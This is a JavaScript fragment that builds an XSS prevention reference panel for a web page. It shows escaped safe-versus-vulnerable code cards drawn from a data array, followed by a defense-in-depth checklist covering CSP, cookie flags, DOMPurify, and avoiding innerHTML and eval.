    panel.innerHTML = `
      <div class="xl-card">
        <h3>XSS Prevention Reference</h3>
        <p style="font-size:12px;color:#6a8a9a;margin:0 0 4px">Context-specific defenses against Cross-Site Scripting</p>
      </div>
      ${XL_PREVENTION.map(item => `
        <div class="xl-prevention">
          <h4>${esc(item.title)}</h4>
          <p>${esc(item.desc)}</p>
          <div style="font-size:12px;color:#00ff88;margin-bottom:4px;font-weight:600">&#x2713; Safe (Do This)</div>
          <div class="xl-code-block safe">${esc(item.safe)}</div>
          <div style="font-size:12px;color:#ff4444;margin:8px 0 4px;font-weight:600">&#x2717; Vulnerable (Don't Do This)</div>
          <div class="xl-code-block bad">${esc(item.bad)}</div>
          <div style="font-size:12px;color:#00aaff;margin:8px 0 4px;font-weight:600">Library / Tool</div>
          <div class="xl-code-block lib">${esc(item.lib)}</div>
        </div>
      `).join('')}
      <div class="xl-card">
        <h3>Defense-in-Depth Checklist</h3>
        <div style="font-size:13px;line-height:2">
          ${[
            'Use context-aware output encoding (HTML, JS, URL, CSS)',
            'Implement Content Security Policy (CSP) headers',
            'Set HttpOnly and Secure flags on session cookies',
            'Use SameSite cookie attribute',
            'Validate and sanitize input on server side',
            'Use DOMPurify or equivalent for HTML sanitization',
            'Avoid innerHTML — use textContent or createElement',
            'Avoid eval(), setTimeout(string), setInterval(string)',
            'Use Subresource Integrity (SRI) for CDN scripts',
            'Implement Trusted Types API where supported',
            'Use X-Content-Type-Options: nosniff header',
            'Regular security testing with automated scanners',
          ].map(item => `<label style="display:flex;gap:8px;align-items:center;cursor:pointer;color:#c8d6e5">
            <input type="checkbox" style="accent-color:#00ff88"> ${esc(item)}
          </label>`).join('')}
        </div>
      </div>`;
  }
}
